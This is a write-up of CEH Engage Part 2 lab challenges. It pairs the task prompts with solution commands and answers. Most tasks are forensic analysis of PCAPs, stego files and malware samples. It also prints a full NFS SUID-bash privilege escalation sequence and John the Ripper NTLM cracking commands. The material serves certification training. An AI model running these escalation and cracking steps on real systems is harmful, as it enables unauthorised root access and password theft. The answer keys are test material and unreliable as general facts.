# 2️⃣ CEH Engage Part 2



You are assigned a task to crack the NTLM password hashes captured by the internal security team. The password hash has been stored in the Documents folder of the Parrot Security console machine. What is the password of user James?

```
john --format=NT hashes.txt
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>



You are assigned a task to crack the NTLM password hashes captured by the internal security team. The password hash has been stored in the Documents folder of the Parrot Security console machine. What is the password of user Jones?

```
john --format=NT hashes.txt
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



You have got user-level access to the machine with IP 172.16.0.11. Your task is to escalate the privileges to that of the root user on the machine and read the content in the rootflag.txt file. (Note: all the flag files are located at the root, Desktop, Documents, or Downloads folder for the respective users/machines). Note: use LinuxPass when asked for machine password.

```
nmap -sV <IP addr>
```

```
sudo apt-get install nfs-common
```

```
showmount -e <IP addr>

mkdir /tmp/nfs

sudo mount -t nfs <IP addr>:/home /tmp/nfs

cd /tmp/nfs

sudo cp /bin/bash

sudo chmod +s bash

ls -la bash

ssh -l ubuntu <IP addr>

cd /home

./bash -p

id
```



<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>



An employee in your organization is suspected of sending important information to an accomplice outside the organization. The incident response team has intercepted some files from the employee's system that they believe have hidden information. You are asked to investigate a file named Confidential.txt and extract hidden information. Find out the information hidden in the file. Note: The Confidential.txt file is located at C:\Users\Admin\Documents in EH Workstation – 2 machine.

```
SNOW.EXE -C Confidential.txt
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



The incident response team has intercepted an image file from a communication that is supposed to have just text. You are asked to investigate the file and check if it contains any hidden information. Find out the information hidden in the file. Note: The vacation.bmp file is located at C:\Users\Admin\Documents in EH Workstation – 2 machine.

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>



You are a malware analyst working for CEHORG. During your assessment within your organisation's network, you found a malware face.exe. The malware is extracted and placed at C:\Users\Admin\Documents in the EH Workstation – 2 machine. Analyze the malware and find out the File pos for KERNEL32.dll text. (Hint: exclude zeros.)



<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>











Analyze an ELF executable (Sample-ELF) file placed at C:\Users\Admin\Documents in the EH Workstation – 2 machines to determine the CPU Architecture it was built for.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>





You have been given a task to audit the passwords of a server present in CEHORG network. Find out the password of the user Adam and submit it. (Note: Use Administrator/ CSCPa\$$ when asked for credentials).

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>









Use Yersinia on the “EH Workstation – 1” (Parrot Security) machine to perform the DHCP starvation attack. Analyze the network traffic generated during the attack and find the Transaction ID of the DHCP Discover packets.

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>



CEHORG suspects a possible sniffing attack on a machine in its network. The organization has retained the network traffic data for the session and stored it in the Documents folder in EH Workstation – 2 (Windows 11) machine as sniffsession.pcap. You have been assigned a task to analyze and find out the protocol used for sniffing on its network.

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>



As an ethical hacker, you are tasked to analyze the traffic capture file webtraffic.pcapng. Find out the packet's id that uses ICMP protocol to communicate. Note: The webtraffic.pcapng file is located at C:\Users\Administrator\Documents\ in the Documents folder on EH Workstation – 2 (Windows 11) machine.

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



An attacker has created a custom UDP packet and sent it to one of the machines in the CEHORG. You have been given a task to study the ""CustomUDP.pcapng"" file and find the data size of the UDP packet (in bytes). Note: The CustomUDP.pcapng file is located at C:\Users\Administrator\Documents\ in the Documents folder on EH Workstation – 2 (Windows 11) machine.

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>



A denial-of-service attack has been launched on a target machine in the CEHORG network. A network session file "DoS.pcapng" has been captured and stored in the Documents folder of the EH Workstation - 2 machine. Find the IP address of the attacker's machine.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>



A machine in CEHORG network has been installed with a spyware by an Ex-employee. You are given a task to connect to the attacked machine to find out the hidden flag in the documents folder.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>









A disgruntled employee in CEHORG has used the Covert\_TCP utility to share a secret message with another user in the CEHORG network. Covert\_TCP manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can be used to hide the data inside IP header fields. The employee used the IP ID field to hide the message. The network capture file “Capture.pcapng” has been retained in the “C:\Users\Administrator\Documents” directory of the “EH Workstation – 2” machine. Analyze the session to get the message that was transmitted.



<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>





CEHORG has assigned you with analysing the snapshot of the operating system registry and perform the further steps as part of dynamic analysis and find out the whether the driver packages registry is changed. Give your response as Yes/No.

\-> Yes





Perform windows service monitoring and find out the service type associated with display name "afunix".



<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





CEHORG has found that one of its web application movies.cehorg.com running on its network is leaking credentials in plain text. You have been assigned a task of analysing the movies.pcap file and find out the leaked credentials. Note: The movies.pcapng file is located at C:\Users\Administrator\Documents\ in the Documents folder on EH Workstation – 2 (Windows 11) machine. Make a note of the credentials obtained in this flag, it will be used in the Part 4 of CEH Skill Check.

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>



CEHORG hosts a datacenter for its bussiness clients. While analyzing the network traffic it was observed that there was a huge surge of incoming traffic from multiple sources. You are given a task to analyze and study the DDoS.pcap file. The captured network session (DDoS.pcapng) is stored in the Documents folder of the EH Workstation -2 machine. Determine the number of machines that were used to initiate the attack.

\-> 3

